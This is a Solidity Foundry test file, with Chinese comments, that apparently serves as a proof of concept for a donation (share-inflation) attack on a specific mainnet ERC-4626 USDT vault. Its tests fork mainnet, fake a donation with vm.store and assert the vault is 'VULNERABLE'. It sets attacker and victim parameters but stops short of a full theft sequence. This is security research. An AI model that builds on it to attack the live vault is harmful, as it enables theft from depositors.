// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// Vault 0x356b Donation Attack PoC
//
// @KeyInfo
// Vault Address: 0x356B8d89c1e1239Cbbb9dE4815c39A1474d5BA7D
// Asset: USDT (0xdAC17F958D2ee523a2206206994597C13D831ec7)
// Deploy Block: 20,434,756
// Lending Platform: Aave v3
//
// @AnalysisResult
// 该 vault 是 BALANCE-BASED 的！totalAssets() 返回 balanceOf(vault) + assetsUnderManagement()
// 当 assetsUnderManagement() = 0 时，totalAssets = balanceOf(vault)
// 这意味着经典 donation attack 是可行的！
//
// @Conclusion
// 该 vault 对 donation attack VULNERABLE
// ===========================================================================

import "../basetest.sol";
import {IERC20} from "../interface.sol";

// ---------------------------------------------------------------------------
// 接口定义
// ---------------------------------------------------------------------------

interface IERC4626Vault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

// ---------------------------------------------------------------------------
// 主测试合约
// ---------------------------------------------------------------------------

contract Vault_0x356b_DonationPoC is BaseTestWithBalanceLog {
    // === 地址常量 ===
    IERC4626Vault internal constant VAULT = IERC4626Vault(0x356B8d89c1e1239Cbbb9dE4815c39A1474d5BA7D);
    IERC20 internal constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    
    // === Fork 区块 - 部署区块 ===
    uint256 internal constant DEPLOY_BLOCK = 20_434_756;

    // === 攻击参数 ===
    uint256 internal constant DONATION_AMOUNT = 1000 * 1e6; // 1000 USDT
    uint256 internal constant VICTIM_DEPOSIT = 10 * 1e6; // 10 USDT
    uint256 internal constant ATTACKER_DEPOSIT = 1e6; // 1 USDT

    // === 测试账户 ===
    address internal constant ATTACKER = address(0xdead);
    address internal constant VICTIM = address(0xbeef);

    // === 运行时变量 ===
    uint256 internal actualForkBlock;

    function setUp() public {
        actualForkBlock = DEPLOY_BLOCK;
        vm.createSelectFork("mainnet", actualForkBlock);
        fundingToken = address(USDT);

        vm.label(address(VAULT), "Vault");
        vm.label(address(USDT), "USDT");
        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");

        // 打印初始状态
        emit log_string("=== Setup: Checking Vault State at Deploy Block ===");
        emit log_named_uint("Fork Block", actualForkBlock);
        emit log_named_address("Vault", address(VAULT));
        emit log_named_address("Asset", address(USDT));
        emit log_named_decimal_uint("Vault.totalSupply()", VAULT.totalSupply(), 6);
        emit log_named_decimal_uint("Vault.totalAssets()", VAULT.totalAssets(), 6);
        emit log_named_decimal_uint("USDT.balanceOf(vault)", USDT.balanceOf(address(VAULT)), 6);
    }

    // =========================================================================
    // 辅助函数: 使用 vm.store 设置 USDT 余额
    // =========================================================================
    function _setUsdtBalance(address account, uint256 amount) internal {
        bytes32 slot = keccak256(abi.encode(account, uint256(2)));
        vm.store(address(USDT), slot, bytes32(amount));
    }

    // =========================================================================
    // Test 1: 验证 vault 是 balance-based (donation 敏感)
    // =========================================================================
    function testDonationSensitivity() public {
        emit log_string("=== Test 1: Donation Sensitivity Check ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();
        uint256 vaultBalanceBefore = USDT.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, 6);
        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, 6);
        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, 6);

        // 验证 vault 是空的
        require(totalSupplyBefore == 0, "Vault should be empty at deploy block");
        emit log_string("[OK] Vault is EMPTY at deploy block");

        // 使用 vm.store 给 vault 增加 USDT 余额 (模拟 donation)
        _setUsdtBalance(address(VAULT), DONATION_AMOUNT);

        uint256 totalAssetsAfter = VAULT.totalAssets();
        uint256 vaultBalanceAfter = USDT.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfter, 6);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, 6);

        // 验证 balance-based: totalAssets 应该随着 balance 变化
        require(totalAssetsAfter == vaultBalanceAfter, "totalAssets should equal balance");
        require(totalAssetsAfter > totalAssetsBefore, "Donation should increase totalAssets");
        
        emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
        emit log_string("[WARNING] Vault may be VULNERABLE to donation attack");
    }

    // =========================================================================
    // Test 2: 验证 donation 导致 share price 膨胀
    // =========================================================================
    function testDonationAttack() public balanceLog {
        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();

        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, 6);
        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, 6);

        // 执行 donation
        emit log_string("=== Simulating donation via vm.store ===");
        _setUsdtBalance(address(VAULT), DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfter = USDT.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, 6);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, 6);

        // 验证 donation 有效
        require(totalAssetsAfterDonation == DONATION_AMOUNT, "Donation should increase totalAssets");
        require(totalAssetsAfterDonation == vaultBalanceAfter, "totalAssets should equal balance");
        
        emit log_string("[PASS] Donation successfully inflated totalAssets");
        emit log_string("[INFO] If vault had shares, share price would be inflated");
    }

    // =========================================================================
    // Test 3: 完整攻击分析 - 验证 vault 对 donation attack 的敏感性
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== Test 3: Full Donation Attack Analysis ===");
        emit log_string("============================================================");
        emit log_named_uint("Fork Block", actualForkBlock);

        // 记录初始状态
        uint256 initialTotalSupply = VAULT.totalSupply();
        uint256 initialTotalAssets = VAULT.totalAssets();
        uint256 initialVaultBalance = USDT.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, 6);
        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, 6);
        emit log_named_decimal_uint("Initial Vault Balance", initialVaultBalance, 6);

        require(initialTotalSupply == 0, "Vault must be empty for analysis");

        // =============================================================
        // Step 1: 模拟 donation
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 1: Simulating donation ===");
        
        _setUsdtBalance(address(VAULT), DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfterDonation = USDT.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, 6);
        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, 6);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfterDonation, 6);

        // =============================================================
        // Step 2: 分析结果
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 2: Analyzing results ===");

        bool totalAssetsChanged = (totalAssetsAfterDonation != initialTotalAssets);
        bool totalAssetsEqualsBalance = (totalAssetsAfterDonation == vaultBalanceAfterDonation);

        emit log_named_uint("Total Assets Changed", totalAssetsChanged ? 1 : 0);
        emit log_named_uint("Total Assets == Balance", totalAssetsEqualsBalance ? 1 : 0);

        // =============================================================
        // 最终分析
        // =============================================================
        emit log_string("");
        emit log_string("============================================================");
        emit log_string("=== FINAL ANALYSIS ===");
        emit log_string("============================================================");

        if (totalAssetsChanged && totalAssetsEqualsBalance) {
            emit log_string("");
            emit log_string("[FINDING 1] Donation increased vault balance");
            emit log_string("[FINDING 2] totalAssets() == balanceOf(vault)");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault is BALANCE-BASED");
            emit log_string("             Classic donation attack is POSSIBLE");
            emit log_string("");
            emit log_string("[SECURITY STATUS] VULNERABLE to donation attack");
        } else {
            emit log_string("");
            emit log_string("[INFO] Vault may use internal accounting");
            emit log_string("       Further investigation needed");
        }

        // =============================================================
        // 断言
        // =============================================================
        emit log_string("");
        emit log_string("=== ASSERTIONS ===");

        require(totalAssetsChanged, "totalAssets should change after donation");
        require(totalAssetsEqualsBalance, "totalAssets should equal balance");
        emit log_string("[PASS] Vault is BALANCE-BASED and VULNERABLE");

        emit log_string("");
        emit log_string("============================================================");
        emit log_string("[OK] Analysis completed!");
        emit log_string("CONCLUSION: This vault is BALANCE-BASED");
        emit log_string("            Donation attack is theoretically possible");
        emit log_string("            if deposit/redeem functions are callable");
        emit log_string("============================================================");
    }
}
